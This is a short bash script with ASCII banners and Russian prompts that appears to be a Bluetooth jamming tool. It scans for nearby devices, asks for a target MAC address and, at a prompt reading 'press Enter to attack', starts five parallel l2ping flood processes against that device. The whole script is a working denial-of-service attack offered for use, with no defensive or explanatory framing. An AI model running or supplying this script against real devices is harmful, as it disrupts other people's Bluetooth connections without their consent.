
#COLORS
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"
echo -e "$blue __________.____     ____ _________________________________   ______________________ ___        ____.  _____      _____    $nc"
echo -e "$blue \______   \    |   |    |   \_   _____/\__    ___/\_____  \  \_____  \__    ___/   |   \      |    | /  _  \    /     \   $nc"
echo -e "$blue  |    |  _/    |   |    |   /|    __)_   |    |    /   |   \  /   |   \|    | /    ~    \     |    |/  /_\  \  /  \ /  \  $nc"
echo -e "$blue  |    |   \    |___|    |  / |        \  |    |   /    |    \/    |    \    | \    Y    / /\__|    /    |    \/    Y    \ $nc"
echo -e "$blue  |______  /_______ \______/ /_______  /  |____|   \_______  /\_______  /____|  \___|_  /  \________\____|__  /\____|__  / $nc"
echo -e "$blue         \/        \/                \/                    \/         \/              \/                    \/         \/  $nc"
echo -e "$Fiuscha                     .__                         $nc"
echo -e "$Fiuscha  __ __  ______ ____ |  |   ____   ______ ______ $nc"
echo -e "$Fiuscha |  |  \/  ___// __ \|  | _/ __ \ /  ___//  ___/ $nc"
echo -e "$Fiuscha |  |  /\___ \\  ___/|  |_\  ___/ \___ \ \___ \  $nc"
echo -e "$Fiuscha |____//____  >\___  >____/\___  >____  >____  > $nc"
echo -e "$Fiuscha            \/     \/          \/     \/     \/  $nc"
sudo lsmod | grep blue &>/dev/null
systemctl enable bluetooth.service &>/dev/null
systemctl start bluetooth.service &>/dev/null

if rfkill unblock bluetooth ;then
echo "3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
 
echo -e "$red Включаем Bluetooth $nc"
else echo -e "Проблемы с подключением Bluetooth"
fi
echo -e ""

echo -e "$Cyan [*]СКАНИРУЕМ...$nc"
echo -e ""
xterm -hold -e 'while [ 1 ]; do hcitool scan ;done' &
read -p $'\033[1;33m[*]Введите МАК-АДРЕСС (xx:xx:xx:xx:xx:xx) : \033[0m' bdadd
echo -e "" 
read -p $'\033[1;33m[*]НАЖМИТЕ ENTER ДЛЯ АТАКИ\033[0m'
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
xterm -e l2ping -f $bdadd&
